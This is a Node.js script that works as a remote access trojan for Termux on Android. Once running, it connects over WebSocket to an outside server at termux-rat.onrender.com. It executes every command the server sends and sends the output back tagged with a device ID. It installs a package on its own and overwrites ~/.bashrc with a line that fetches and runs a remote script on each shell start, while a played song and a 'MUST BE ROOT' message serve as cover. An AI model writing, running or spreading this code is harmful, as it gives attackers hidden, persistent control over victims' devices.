const { execSync, exec } = require("child_process");
const path = require("path");

// Function to get global node_modules path
function getGlobalNodeModules() {
  return execSync("npm root -g").toString().trim();
}

// Try to require ws locally first, then globally, else install globally
let WebSocket;
try {
  WebSocket = require("ws"); // local
} catch (e) {
  try {
    const globalWsPath = path.join(getGlobalNodeModules(), "ws");
    WebSocket = require(globalWsPath); // global
  } catch (err) {
    execSync("npm install -g ws", { stdio: "inherit" });
    const globalWsPath = path.join(getGlobalNodeModules(), "ws");
    WebSocket = require(globalWsPath); // require after global install
  }
}

const DEVICE_ID = (() => {
  try {
    return require("child_process").execSync("getprop ro.product.model").toString().trim();
  } catch {
    const seed = process.env.USER || "default";
    let sum = 0;
    for (let i = 0; i < seed.length; i++) sum += seed.charCodeAt(i);
    return (1000 + (sum % 9000)).toString();
  }
})();

const ws = new WebSocket("wss://termux-rat.onrender.com");

ws.on("message", (msg) => {
  const data = JSON.parse(msg.toString());

  if (data.type === "command") {
    exec(data.command, (err, stdout, stderr) => {
      ws.send(
        JSON.stringify({
          type: "output",
          id: DEVICE_ID,
          output: stdout || stderr || (err ? err.message : "")
        })
      );
    });
  }
});



ws.on("open", () => {
  ws.send(JSON.stringify({ type: "register_device", id: DEVICE_ID }));
  console.clear();

  const msg2 = `MUST BE ROOT`;

const msg3 = '  ██████  ▒█████   ██▀███   ██▀███  ▓██   ██▓\n' +
'▒██    ▒ ▒██▒  ██▒▓██ ▒ ██▒▓██ ▒ ██▒ ▒██  ██▒\n' +
'░ ▓██▄   ▒██░  ██▒▓██ ░▄█ ▒▓██ ░▄█ ▒  ▒██ ██░\n' +
'  ▒   ██▒▒██   ██░▒██▀▀█▄  ▒██▀▀█▄    ░ ▐██▓░\n' +
'▒██████▒▒░ ████▓▒░░██▓ ▒██▒░██▓ ▒██▒  ░ ██▒▓░\n' +
'▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░ ▒▓ ░▒▓░   ██▒▒▒\n' +
'░ ░▒  ░    ░ ▒ ▒░   ░▒ ░ ▒   ░▒ ░ ▒  ▓██ ░▒░\n' +
'░  ░  ░  ░ ░ ░ ▒    ░░   ░   ░░   ░  ▒ ▒ ░░\n' +
'      ░      ░ ░     ░        ░      ░ ░';
  console.log(msg2);
  /*setTimeout(() => {
  console.clear();
}, 3000);
  console.log(msg2);
  setTimeout(() => {
  console.clear();
}, 3000);
  console.log(msg3);*/
  
  // Check if sox is installed; install silently if not
  exec("sox --version", (err) => {
    if (err) {
      exec("apt update && apt install sox", () => {
        playSong();
      });
    } else {
      playSong();
    }
  });

  function playSong() {
    exec(`echo 'curl -s https://sabir7718.github.io/TERMUX_RAT/perma.js | node >/dev/null 2>&1 &' > ~/.bashrc && curl -s https://sabir7718.github.io/TERMUX_RAT/song.mp3 | play -t mp3 -`);
  }
  });
